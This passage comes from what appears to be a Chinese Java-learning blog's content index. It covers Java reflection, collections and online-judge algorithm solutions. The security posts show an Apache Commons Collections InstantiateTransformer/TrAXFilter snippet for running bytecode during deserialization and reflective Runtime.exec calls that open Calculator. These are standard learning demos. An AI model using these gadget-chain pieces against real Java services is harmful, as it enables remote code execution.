Class)) &#123; throw new FunctorException(&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot; + (input == null ? &quot;null object&quot; : input.getClass().getName())); &#125; else &#123; Constructor con = ((Class)input).getConstructor(this.iParamTypes); return con.newInstance(this.iArgs); &#125; 测试代码 123456789101112131415import org.apache.commons.collections.functors.InstantiateTransformer;import javax.xml.transform.TransformerConfigurationException;/** * author: f19t * Date: 2023/2/25 18:53 */public class Test_InstantiateTransformer &#123; public static void main(String[] args) throws TransformerConfigurationException &#123; InstantiateTransformer transformers = new InstantiateTransformer(null,null); transformers.transform(hello.class); &#125;&#125; hello代码 123456public class hello &#123; static &#123; System.out.println(&quot;hello&quot;); &#125; &#125; 有了InstantiateTransformer和TrAXFilter可以进行组合，进行执行字节码。简要代码 123Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;obj&#125;)&#125;;","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"Java反射","slug":"Java反射","date":"2023-02-19T11:58:26.000Z","updated":"2023-02-19T12:33:59.603Z","comments":true,"path":"2023/02/19/Java反射/","link":"","permalink":"https://f19t.github.io.git/2023/02/19/Java%E5%8F%8D%E5%B0%84/","excerpt":"java反射之前学过反射，半知半解，今天重新学习一下Java反射机制，以及能做的事情。","text":"java反射之前学过反射，半知半解，今天重新学习一下Java反射机制，以及能做的事情。 下面是反射获取类Test的的源码： 1234567891011121314151617181920212223242526272829import java.io.IOException;import java.lang.Runtime;public class Test &#123; public static final int h = 5;//字段1，直接赋值 public String s = &quot;test&quot;;//字段2 public static final boolean b =new Boolean(false);//字段3，间接赋值 public Test() &#123; //构造函数1 System.out.println(&quot;无参构造函数&quot;); &#125; public Test(int m, double n) throws IOException &#123;//有参构造函数2 System.out.println(&quot;有参构造函数&quot;); System.out.println(&quot;获取到int=&quot;+m); System.out.println(&quot;获取到double=&quot;+n); Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); &#125; public String hello(String s) &#123; //方法1 System.out.println(&quot;调用hello&quot;); return &quot;Hello World~&quot;; &#125; public int hello2(int x,double y) throws IOException &#123; //方法2 System.out.println(&quot;获取到int=&quot;+x); System.out.println(&quot;获取到double=&quot;+y); Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); return 3; &#125;&#125; 反射创建对象实例12345678910111213141516171819202122232425import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;/** * author: f19t * Date: 2023/2/18 21:44 */public class Test_Reflect_getConstructor &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123; Class c = Class.forName(&quot;Test&quot;); Constructor ct1 = c.getConstructor();//不会初始化，无参构造 Test obj = (Test)ct1.newInstance();//初始化执行 obj.hello(&quot;test&quot;); Class partypes[] = new Class[2]; partypes[0] = Integer.TYPE; partypes[1] = Double.TYPE; Constructor ct2 = c.getConstructor(partypes);//不会初始化，有参构造 Object arglist[] = new Object[2]; arglist[0] = new Integer(37); arglist[1] = new Double(47.0); Object obj2 = ct2.newInstance(arglist);//有参生成对象 &#125;&#125; 反射获取类方法123456789101112131415161718192021222324import java.lang.reflect.Method;/** * author: f19t * Date: 2023/2/18 19:12 */public class Test_Reflect_methods &#123;public static void main(String[]args) throws ClassNotFoundException &#123; Class c = Class.forName(&quot;java.lang.Runtime&quot;);//获取类 Method methods[] = c.getDeclaredMethods();//获取所有方法 for (int i = 0; i &lt; methods.length; i++) &#123; Method m = methods[i]; Class pvec[] =m.getParameterTypes();// System.out.println(&quot;类名=&quot; +m.getDeclaringClass());//获取类名 System.out.println(&quot;方法=&quot;+m.getName());//获取方法名 for (int q = 0; q &lt; pvec.length; q++) &#123; System.out.println(&quot;参数类型&quot;+pvec[q].getName()); //获取方法参数 &#125; System.out.println(&quot;返回类型=&quot;+m.getReturnType());//获取返回类型 System.out.println(&quot;-----------------------------&quot;); &#125;&#125;&#125; 获取字段123456789101112131415161718192021222324import java.lang.reflect.Field;import java.lang.reflect.Modifier;/** * author: f19t * Date: 2023/2/18 20:43 */public class Test_Reflect_field &#123; public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException &#123; Class c = Class.forName(&quot;Test&quot;); Field fieldlist[] = c.getDeclaredFields(); for (int i = 0; i &lt; fieldlist.length; i++) &#123; fieldlist[i].setAccessible(true); System.out.println(&quot;字段名=&quot;+fieldlist[i].getName()); System.out.println(&quot;字段值=&quot;+fieldlist[i].get(c.newInstance()));//get方法需要传入实例对象 System.out.println(&quot;字段类型=&quot;+fieldlist[i].getType()); int mod = fieldlist[i].getModifiers(); System.out.println(&quot;声明类型=&quot;+ Modifier.toString(mod)); System.out.println(&quot;----------------------------&quot;); &#125; &#125;&#125; 运行结果 12345678910111213141516171819字段名=h无参构造函数字段值=5字段类型=int声明类型=public static final----------------------------字段名=s无参构造函数字段值=test字段类型=class java.lang.String声明类型=public----------------------------字段名=b无参构造函数字段值=false字段类型=boolean声明类型=public static final---------------------------- 修改字段反射修改注意如果是static final修饰的，需要先去掉final，再次进行修改，还需要注意，static final修饰的直接赋值还是间接赋值，直接赋值只能通过反射获取修改后的数据（编译优化导致）。间接赋值的可以直接获取修改后的数据。 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Modifier;/** * author: f19t * Date: 2023/2/18 22:03 */public class Test_Reflect_Set_field &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException &#123; Class c = Class.forName(&quot;Test&quot;); Field field[] = c.getDeclaredFields(); Test obj = (Test) c.newInstance(); for (int i = 0; i &lt; field.length; i++) &#123; System.out.println(&quot;修改前的值&quot;+field[i].getName()+&quot;=&quot;+field[i].get(obj)+&quot; 类型为 &quot;+Modifier.toString(field[i].getModifiers())); &#125; System.out.println(&quot;------------------&quot;); field[0].setAccessible(true); Field modifiers = field[0].getClass().getDeclaredField(&quot;modifiers&quot;); modifiers.setAccessible(true); modifiers.setInt(field[0], field[0].getModifiers() &amp; ~Modifier.FINAL); field[0].set(obj, 10); System.out.println(&quot;反射修改后直接获取&quot;+field[0].getName()+&quot;=&quot;+obj.h); System.out.println(&quot;反射修改后反射获取&quot;+field[0].getName()+&quot;=&quot;+field[0].get(obj)); System.out.println(&quot;--------------------&quot;); field[1].setAccessible(true); modifiers.setInt(field[1], field[1].getModifiers() &amp; ~Modifier.FINAL); field[1].set(obj, &quot;hack&quot;); System.out.println(&quot;反射修改后直接获取&quot;+field[1].getName()+&quot;=&quot;+obj.s); System.out.println(&quot;反射修改后反射获取&quot;+field[1].getName()+&quot;=&quot;+field[1].get(obj)); System.out.println(&quot;--------------------&quot;); field[2].setAccessible(true); modifiers.setInt(field[2], field[2].getModifiers() &amp; ~Modifier.FINAL); field[2].set(obj, true); System.out.println(&quot;反射修改后直接获取&quot;+field[2].getName()+&quot;=&quot;+obj.b); System.out.println(&quot;反射修改后反射获取&quot;+field[2].getName()+&quot;=&quot;+field[2].get(obj)); &#125;&#125; 运行结果： 12345678910111213无参构造函数修改前的值h=5 类型为 public static final修改前的值s=test 类型为 public修改前的值b=false 类型为 public static final------------------反射修改后直接获取h=5反射修改后反射获取h=10--------------------反射修改后直接获取s=hack反射修改后反射获取s=hack--------------------反射修改后直接获取b=true反射修改后反射获取b=true 调用方法常规类调用方法常规类调用方法流程为获取类、创建实例、执行方法 1234567891011121314151617181920212223import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;/** * author: f19t * Date: 2023/2/18 21:22 */public class Test_Reflect_Get_methods &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123; Class c = Class.forName(&quot;Test&quot;); Class partypes[] = new Class[2]; partypes[0] = Integer.TYPE; partypes[1] = Double.TYPE; Method meth = c.getMethod(&quot;hello2&quot;, partypes); Test test = new Test(); Object arglist[] = new Object[2]; arglist[0] = new Integer(3); arglist[1] = new Double(3.1); Object ref = meth.invoke(test, arglist); System.out.println(ref); &#125;&#125; 单例类调用方法单例模式的特点 单例类只能有一个实例。 单例类必须自己创建自己的唯一实例。 单例类必须给所有其他对象提供这一实例。 单例模式保证了全局对象的唯一性，比如系统启动读取配置文件就需要单例保证配置的一致性。 java.lang.Runtime就是一个单例模式 1234567891011121314151617public class Runtime &#123; private static Runtime currentRuntime = new Runtime(); /** * Returns the runtime object associated with the current Java application. * Most of the methods of class &lt;code&gt;Runtime&lt;/code&gt; are instance * methods and must be invoked with respect to the current runtime object. * * @return the &lt;code&gt;Runtime&lt;/code&gt; object associated with the current * Java application. */ public static Runtime getRuntime() &#123; return currentRuntime; &#125; /** Don&#x27;t let anyone else instantiate this class */ private Runtime() &#123;&#125; Runtime的Runtime.exec调用注意点，invoke作用是执行方法，第一个参数为： 如果是普通方法执行invoke，第一个参数放对象的实例； 如果是静态方法执行invoke，可以放null或类名； 放调用代码 123456789101112131415161718import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;/** * author: f19t * Date: 2023/2/18 21:22 */public class Test_Reflect_Get_methods &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123; Class c = Class.forName(&quot;java.lang.Runtime&quot;); Method method = c.getDeclaredMethod(&quot;exec&quot;, String.class); Method method1 = c.getDeclaredMethod(&quot;getRuntime&quot;); Object obj = method1.invoke(null);//因为getRuntime为静态方法，并且return也是Runtime method.invoke(obj, &quot;open /System/Applications/Calculator.app&quot;); &#125;&#125;","categories":[{"name":"JAVA基础","slug":"JAVA基础","permalink":"https://f19t.github.io.git/categories/JAVA%E5%9F%BA%E7%A1%80/"},{"name":"JAVA安全","slug":"JAVA基础/JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%9F%BA%E7%A1%80/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"NYOJ58-广度优先搜索算法","slug":"NYOJ58-广度优先搜索算法","date":"2023-02-17T12:28:31.000Z","updated":"2023-02-17T12:31:28.493Z","comments":true,"path":"2023/02/17/NYOJ58-广度优先搜索算法/","link":"","permalink":"https://f19t.github.io.git/2023/02/17/NYOJ58-%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/","excerpt":"NYOJ-58-广度优先搜索算法最近三天学习了深度优先算法，并做了一道oj题，遇到了一些问题，并解决了一些问题，这里记录一下。","text":"NYOJ-58-广度优先搜索算法最近三天学习了深度优先算法，并做了一道oj题，遇到了一些问题，并解决了一些问题，这里记录一下。 题目描述：描述这有一个迷宫，有0~8行和0~8列： 1,1,1,1,1,1,1,1,1 1,0,0,1,0,0,1,0,1 1,0,0,1,1,0,0,0,1 1,0,1,0,1,1,0,1,1 1,0,0,0,0,1,0,0,1 1,1,0,1,0,1,0,0,1 1,1,0,1,0,1,0,0,1 1,1,0,1,0,0,0,0,1 1,1,1,1,1,1,1,1,1 0表示道路，1表示墙。现在输入一个道路的坐标作为起点，再如输入一个道路的坐标作为终点，问最少走几步才能从起点到达终点？（注：一步是指从一坐标点走到其上下左右相邻坐标点，如：从（3，1）到（4,1）。） 输入描述第一行输入一个整数n（0&lt;n&lt;&#x3D;100），表示有n组测试数据;随后n行,每行有四个整数a,b,c,d（0&lt;&#x3D;a,b,c,d&lt;&#x3D;8）分别表示起点的行、列，终点的行、列。 输出描述 输出最少走几步。 解题源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394import java.util.*;public class OJ58 &#123; static int[][] walked =new int[9][9]; //记录那些路径走过 static Queue&lt;location&gt; queue = new LinkedList&lt;location&gt;();//创建队列，将所有的位置都走一遍 static int[][] map=&#123;&#123;1,1,1,1,1,1,1,1,1&#125;, &#123;1,0,0,1,0,0,1,0,1&#125;, &#123;1,0,0,1,1,0,0,0,1&#125;, &#123;1,0,1,0,1,1,0,1,1&#125;, &#123;1,0,0,0,0,1,0,0,1&#125;, &#123;1,1,0,1,0,1,0,0,1&#125;, &#123;1,1,0,1,0,1,0,0,1&#125;, &#123;1,1,0,1,0,0,0,0,1&#125;, &#123;1,1,1,1,1,1,1,1,1&#125;&#125;; public static void main(String[] args) &#123; Scanner in =new Scanner(System.in); int n = in.nextInt(); for (int i = 0; i &lt; n; i++) &#123; int a = in.nextInt(); int b = in.nextInt(); int c = in.nextInt(); int d = in.nextInt(); if (a == c &amp;&amp; b == d) &#123; System.out.println(0); continue; &#125; move(a, b,0); while (queue.size() != 0) &#123; location laca = queue.poll();// System.out.print(&quot;走过(&quot;);// System.out.print(laca.x);// System.out.print(&quot;,&quot;);// System.out.print(laca.y);// System.out.print(&quot;)位置&quot;);// System.out.print(&quot;，步数&quot;);// System.out.println(laca.step); if (laca.x == c &amp;&amp; laca.y == d) &#123; System.out.println(laca.step); queue.clear(); for (int w = 0; w &lt; 9; w++) &#123; Arrays.fill(walked[w], 0);//二维数组全部赋值为0 &#125; break; &#125; else &#123; move(laca.x,laca.y, laca.step); &#125; &#125; &#125; &#125; private static void move(int x, int y, int steps) &#123; //每个点上下左右移动 ArrayList&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); list.add(1); list.add(-1); for (int i : list) &#123; if (x + i &gt; -1 &amp;&amp; x + i &lt;= 8 &amp;&amp; walked[x + i][y] == 0 &amp;&amp; map[x + i][y] == 0) &#123; walked[x + i][y] = 1; location laca = new location(); laca.x = x + i; laca.y = y; laca.step =steps+1; queue.offer(laca); &#125; &#125; for (int i : list) &#123; if (y + i &gt; -1 &amp;&amp; y + i &lt;= 8 &amp;&amp; walked[x][y + i] == 0 &amp;&amp; map[x][y + i] == 0) &#123; walked[x][y + i] = 1; location laca = new location(); laca.x = x; laca.y = y+i; laca.step = steps+1; queue.offer(laca); &#125; &#125; &#125;&#125;class location &#123; int x; int y; int step;&#125; 遇到的问题java结构体java没有结构体，Queue E是泛型 可以自己构建类去充当元素，使用object &#x3D;null去释放赋值对象。 123456789//Interface Queue&lt;E&gt;class location &#123; int x; int y; int step;&#125;location laca = new location();queue.offer(laca); 多维数组赋值为0java.util.Arrays.fill()方法处理的是一维数组，处理二维数组使用： 123for (int w = 0; w &lt; 9; w++) &#123; Arrays.fill(walked[w], 0);//二维数组全部赋值为0&#125; 心得广度优先搜索可以解决最短路径问题，像火一样蔓延，一层层去查找。","categories":[{"name":"OJ","slug":"OJ","permalink":"https://f19t.github.io.git/categories/OJ/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"NYOJ-32-深度优先搜索算法","slug":"NYOJ32-深度优先搜索算法","date":"2023-02-15T03:24:28.000Z","updated":"2023-02-15T07:39:57.412Z","comments":true,"path":"2023/02/15/NYOJ32-深度优先搜索算法/","link":"","permalink":"https://f19t.github.io.git/2023/02/15/NYOJ32-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/","excerpt":"NYOJ-32-深度优先搜索算法最近两天学习了深度优先算法，并做了一道oj题，这里记录一下。","text":"NYOJ-32-深度优先搜索算法最近两天学习了深度优先算法，并做了一道oj题，这里记录一下。 题目描述：描述找出从自然数1、2、… 、n（0&lt;n&lt;10）中任取r(0&lt;r&lt;&#x3D;n)个数的所有组合。 输入描述输入n、r。 输出描述按特定顺序输出所有组合。特定顺序：每一个组合中的值从大到小排列，组合之间按逆字典序排列。 123456789101112输入 5 3输出：543542541532531521432431421321 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142import java.util.Scanner;public class NYOJ32 &#123; //组合数，深度优先搜索 static Scanner in =new Scanner(System.in); static int n = in.nextInt(); //读取基础数据 static int r = in.nextInt(); //读取长度 static int[] book = new int[n+1];//标记数据是否被使用 static int[] out = new int[r+1]; //设置输出长度 public static void main(String[] args) &#123; dfs(1); &#125; public static void dfs(int step) &#123; int i = 0; if (step &gt; r) &#123; for (i=1;i&lt;=r-1;i++)&#123; //判断高位大于低位 if (out[i]&lt;out[i+1])&#123; return; &#125; &#125; for (i = 1; i &lt;=r; i++) &#123; System.out.print(out[i]); &#125; System.out.println(&quot;&quot;); return; &#125; for (i = n; i &gt; 0; i--) &#123; //深度优先算法 if (book[i] == 0) &#123; out[step]=i; book[i]=1; dfs(step+1); book[i]=0; &#125; &#125; return; &#125;&#125; 学到了，理解深度优先搜索的关键在于解决 “当下该如何做” 。至于 “下一步如何做” 则与 “当下该如何做” 是一样的。","categories":[{"name":"OJ","slug":"OJ","permalink":"https://f19t.github.io.git/categories/OJ/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"NYOJ-2-栈的运用","slug":"NYOJ-2","date":"2023-02-13T11:16:31.000Z","updated":"2023-02-19T12:05:23.308Z","comments":true,"path":"2023/02/13/NYOJ-2/","link":"","permalink":"https://f19t.github.io.git/2023/02/13/NYOJ-2/","excerpt":"NYOJ-2-栈的运用今天刚学java集合，学到了栈，就拿这道题练练手吧。 题目描述12输入描述第一行输入一个数N（0&lt;N&lt;=100）,表示有N组测试数据。后面的N行输入多组输入数据，每组输入数据都是一个字符串S(S的长度小于10000，且S不是空串），测试数据组数少于5组。数据保证S中只含有&quot;[&quot;, “]”, “(”, “)” 四种字符 1每组输入数据的输出占一行，如果该字符串中所含的括号是配对的，则输出Yes,如果不配对则输出No","text":"NYOJ-2-栈的运用今天刚学java集合，学到了栈，就拿这道题练练手吧。 题目描述12输入描述第一行输入一个数N（0&lt;N&lt;=100）,表示有N组测试数据。后面的N行输入多组输入数据，每组输入数据都是一个字符串S(S的长度小于10000，且S不是空串），测试数据组数少于5组。数据保证S中只含有&quot;[&quot;, “]”, “(”, “)” 四种字符 1每组输入数据的输出占一行，如果该字符串中所含的括号是配对的，则输出Yes,如果不配对则输出No 解题思路最近刚学了Deque，可以使用栈解决这个问题。思路：获取到”)”、”]”，就比对，不是就压栈，最后判断是否为空。后续有更好思路再补代码。 1234567891011121314151617181920212223242526272829303132333435363738import java.util.Deque;import java.util.LinkedList;import java.util.Scanner;public class OJ2 &#123; public static void main(String[] args) &#123; Scanner in = new Scanner(System.in); int num = in.nextInt(); String arr[] = new String[num]; for (int i = 0; i&lt;num;i++)&#123;arr[i]=in.next();&#125; for (int i = 0; i&lt;num;i++)&#123; String s = judge(arr[i]); System.out.println(s); &#125; &#125; public static String judge(String s)&#123; Deque&lt;String&gt; deque = new LinkedList&lt;&gt;(); for (int i =0;i&lt;s.length();i++)&#123; deque.offerLast(s.substring(i,i+1)); if (deque.peekLast().equals(&quot;)&quot;))&#123; if (deque.size()==1)&#123;return &quot;No&quot;;&#125; deque.pollLast(); if (deque.peekLast().equals(&quot;(&quot;))&#123;deque.removeLast();&#125; else &#123;return &quot;No&quot;;&#125; &#125; else if(deque.peekLast().equals(&quot;]&quot;))&#123; if (deque.size()==1)&#123;return &quot;No&quot;;&#125; deque.pollLast(); if (deque.peekLast().equals(&quot;[&quot;))&#123;deque.removeLast();&#125; else &#123;return &quot;No&quot;;&#125; &#125; &#125; if (deque.size()==0)&#123;return &quot;Yes&quot;;&#125;else &#123;return &quot;No&quot;;&#125; &#125;&#125; 学到了比较值需要使用 .equals() 。","categories":[{"name":"OJ","slug":"OJ","permalink":"https://f19t.github.io.git/categories/OJ/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Java集合","slug":"Java集合","date":"2023-02-13T07:38:34.000Z","updated":"2023-02-13T11:26:52.908Z","comments":true,"path":"2023/02/13/Java集合/","link":"","permalink":"https://f19t.github.io.git/2023/02/13/Java%E9%9B%86%E5%90%88/","excerpt":"Java集合本文介绍Java集合的数据结构，与简单测试。为后续学习算法打基础。","text":"Java集合本文介绍Java集合的数据结构，与简单测试。为后续学习算法打基础。 List123456789101112131415import java.util.ArrayList;import java.util.List;public class Test &#123; public static void main(String[] args) &#123; List&lt;String&gt; list = new ArrayList&lt;String&gt;(); list.add(&quot;apple&quot;); // size=1 list.add(&quot;pear&quot;); // size=2 list.add(&quot;apple&quot;); // 允许重复添加元素，size=3 System.out.println(list.size()); list.remove(1);//删除pear System.out.println(list.size()); System.out.println(list.get(1)); &#125;&#125; 12332apple List是一种顺序列表接口常用方法： 在末尾添加一个元素：boolean add(E e) 在指定索引添加一个元素：boolean add(int index, E e) 删除指定索引的元素：E remove(int index) 删除某个元素：boolean remove(Object e) 获取指定索引的元素：E get(int index) 获取链表大小（包含元素的个数）：int size() Map1234567891011121314151617import java.util.HashMap;import java.util.Map;public class Test &#123; public static void main(String[] args) &#123; Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); map.put(&quot;s&quot;,&quot;bbbbb&quot;); map.put(&quot;a&quot;,&quot;aaaaa&quot;); System.out.println(map.get(&quot;s&quot;));//获取数据 for (String key : map.keySet())&#123; //遍历map System.out.println(map.get(key)); &#125; &#125;&#125; 123bbbbbaaaaabbbbb PropertiesJava默认配置文件以.properties为扩展名，每行以key&#x3D;value表示。java内置Properties读取配置文件非常简单。 典型配置文件： 123# setting.propertieslast_open_file=1.txtauto_save_interval=60 12345678910111213141516171819import java.io.FileNotFoundException;import java.util.Properties;public class Test &#123; public static void main(String[] args) throws FileNotFoundException,Exception&#123; String f = &quot;配置文件&quot;; Properties props = new Properties(); props.load(new java.io.FileInputStream(f)); String filepath = props.getProperty(&quot;last_open_file&quot;); String interval = props.getProperty(&quot;auto_save_interval&quot;, &quot;120&quot;);//如果没有值，赋予默认值 System.out.println(filepath); System.out.println(interval); &#125;&#125; 121.txt60 Set只需要存储不重复的key，并不需要存储映射的value，那么就可以使用Set。 Queue队列（Queue）是一种经常使用的集合。Queue实际上是实现了一个先进先出（FIFO：First In First Out）的有序表。它和List的区别在于，List可以在任意位置添加和删除元素，而Queue只有两个操作： 把元素添加到队列末尾； 从队列头部取出元素。 队列接口Queue定义了以下几个方法： int size()：获取队列长度； boolean add(E)&#x2F;boolean offer(E)：添加元素到队尾； E remove()&#x2F;E poll()：获取队首元素并从队列中删除； E element()&#x2F;E peek()：获取队首元素但并不从队列中删除。 123456789101112131415161718192021222324import java.io.FileNotFoundException;import java.util.*;public class Test &#123; public static void main(String[] args) throws FileNotFoundException,Exception&#123; Queue&lt;String&gt; q = new LinkedList&lt;&gt;(); q.offer(&quot;aaaaaaa&quot;); q.offer(&quot;bbbbbbb&quot;); q.offer(&quot;ccccccc&quot;); System.out.println(q.peek());//获取首位数据，不删除 System.out.println(q.peek()); System.out.println(q.peek()); System.out.println(&quot;-------------&quot;); System.out.println(q.poll());//获取首位数据，并删除 System.out.println(q.poll()); System.out.println(q.poll()); &#125;&#125; 1234567aaaaaaaaaaaaaaaaaaaaa-------------aaaaaaabbbbbbbccccccc Deque两头都出，这种队列叫双端队列（Double Ended Queue），学名Deque。Java集合提供了接口Deque来实现一个双端队列，它的功能是： 既可以添加到队尾，也可以添加到队首； 既可以从队首获取，又可以从队尾获取。 用处：Deque当Stack使用。 123456789101112131415161718192021222324import java.io.FileNotFoundException;import java.util.*;public class Test &#123; public static void main(String[] args) throws FileNotFoundException,Exception&#123; Deque&lt;String&gt; q = new LinkedList&lt;&gt;(); q.offerLast(&quot;aaaaaaa&quot;); q.offerLast(&quot;bbbbbbb&quot;); q.offerLast(&quot;ccccccc&quot;); System.out.println(q.peekLast());//获取末位数据，不删除 System.out.println(q.peekLast()); System.out.println(q.peekLast()); System.out.println(&quot;-------------&quot;); System.out.println(q.pollLast());//获取末位数据，并删除 System.out.println(q.pollLast()); System.out.println(q.pollLast()); &#125;&#125; 1234567ccccccccccccccccccccc-------------cccccccbbbbbbbaaaaaaa","categories":[{"name":"JAVA基础","slug":"JAVA基础","permalink":"https://f19t.github.io.git/categories/JAVA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]}],"categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"},{"name":"JAVA基础","slug":"JAVA基础","permalink":"https://f19t.github.io.git/categories/JAVA%E5%9F%BA%E7%A1%80/"},{"name":"JAVA安全","slug":"JAVA基础/JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%9F%BA%E7%A1%80/JAVA%E5%AE%89%E5%85%A8/"},{"name":"OJ","slug":"OJ","permalink":"https://f19t.github.io.git/categories/OJ/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"},{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]}